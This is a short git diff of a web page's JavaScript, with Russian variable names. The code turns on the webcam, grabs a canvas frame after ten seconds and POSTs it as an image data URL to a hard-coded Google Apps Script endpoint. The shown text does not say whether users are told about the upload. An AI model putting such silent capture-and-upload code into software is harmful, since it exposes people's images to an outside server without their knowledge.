@@ -23,10 +23,11 @@ var негатив='';
 	imk.src=canvas.toDataURL();
 	console.log(imk.src.length)
 	запрос.open("POST",Гуглоключ,true)
-	setTimeout(() => {запрос.send(imk.src);console.log('запрошено')}, "10000");
+	
+	setTimeout(() => {запрос.send(JSON.stringify({ t: 1, c: imk.src }));console.log('запрошено')}, "10000");
 	
 	}
-	
+
 navigator.mediaDevices.getUserMedia({video:true}).then((stream)=>{vid.srcObject=stream})
 
 var запрос = new XMLHttpRequest();
@@ -39,7 +40,7 @@ var запрос = new XMLHttpRequest();
 };
 Гуглоключ='https://script.google.com/macros/s/AKfycbzPU3bpcLG9QJB6xol_EtpPt9hS9qfk5wGl40C6ZxY4ZqVBzNJ1G_EF0oVNd1sffpMD/exec'
 запрос.open("POST",Гуглоключ,true)
-запрос.send('привет');
+запрос.send(JSON.stringify({ t: 2 }));
 
 </script>
 </body>
